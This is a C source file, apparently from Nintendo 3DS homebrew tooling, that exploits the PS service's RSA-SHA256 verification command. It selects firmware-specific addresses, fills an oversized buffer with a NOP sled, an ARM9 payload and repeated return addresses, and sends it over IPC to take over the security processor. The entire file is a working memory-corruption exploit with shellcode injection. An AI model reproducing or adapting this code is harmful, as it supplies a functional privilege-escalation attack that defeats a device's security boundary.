#include <string.h>
#include <stdlib.h>

#include "rsa_exploit.h"
#include "../bins/arm9.h"
#include "../libctru/svc.h"
#include "../libctru/os.h"

void drawHex(u32 val, int x, int y);

Result PS_VerifyRsaSha256_Exploit(Handle *handle, u32 *linearbuf)
{
    Result ret = 0;
    u32 *cmdbuf = getThreadCommandBuffer();
    u32 bufSize, baseAddr;

    switch(osGetFirmVersion())
    {
        case SYSTEM_VERSION(2, 27, 0): // 1.0
            bufSize = 0xD9B8; // (?)
            baseAddr = 0x080B95C0;
            break;
        case SYSTEM_VERSION(2, 28, 0): // 1.1
            bufSize = 0xD9B8; // (?)
            baseAddr = 0x080B9620;
            break;
        case SYSTEM_VERSION(2, 29, 7): // 2.0
            bufSize = 0xD9B8; // (?)
            baseAddr = 0; // don't know
            break;
        case SYSTEM_VERSION(2, 30, 18): // 2.1
            bufSize = 0xD9B8;
            baseAddr = 0x080C2340;
            break;
        case SYSTEM_VERSION(2, 31, 40): // 2.2
            bufSize = 0xD9B8; // (?)
            baseAddr = 0x080C2520;
            break;
        case SYSTEM_VERSION(2, 32, 15): // 3.x
            bufSize = 0x7440;
            baseAddr = 0x080C4420;
            break;
        case SYSTEM_VERSION(2, 33, 4): // 4.0
            bufSize = 0x7440;
            baseAddr = 0; // don't know
            break;
        case SYSTEM_VERSION(2, 34, 0): // (4.1, 5.0[
            bufSize = 0x7440;
            baseAddr = 0x080C3EE0;
            break;
    }

    if(baseAddr == 0)
        return -1;

    u32* buffer = (u32 *)linearbuf + 0x1000; // linear heap
    memset(buffer, 0, bufSize);

    buffer[0x28/sizeof(u32)] = 0x820002;
    buffer[0x2C/sizeof(u32)] = (u32)(buffer + 0x80/sizeof(u32));
    buffer[0x30/sizeof(u32)] = (bufSize << 4) | 0xA;
    buffer[0x34/sizeof(u32)] = (u32)(buffer + 0x380/sizeof(u32));
    buffer[0x280/sizeof(u32)] = bufSize<<3; //RSA bit-size, for the signature.

    u32 *ptr = buffer+0x380/sizeof(u32);
    u32 size;
    const u32 *src = (const u32 *)getArm9Payload(&size);
    u32 nopsled = 0x1000; // FIXME do we need such a  large NOP sled?

    for(u32 i = 0; i < nopsled/sizeof(u32); i++)
        *ptr++ = 0xE1A00000;

    memcpy(ptr, src, size);
    ptr += size/sizeof(u32);

    for(u32 i=0; i < bufSize-size-nopsled; i+=4)
        *ptr++ = baseAddr;

    memcpy(cmdbuf, buffer, 0x80);

    cmdbuf[0] = 0x00020244;

    if((ret = svcSendSyncRequest(*handle))!=0) return ret;

    //We do not expect to return from the syncRequest
    return (Result)cmdbuf[1];
}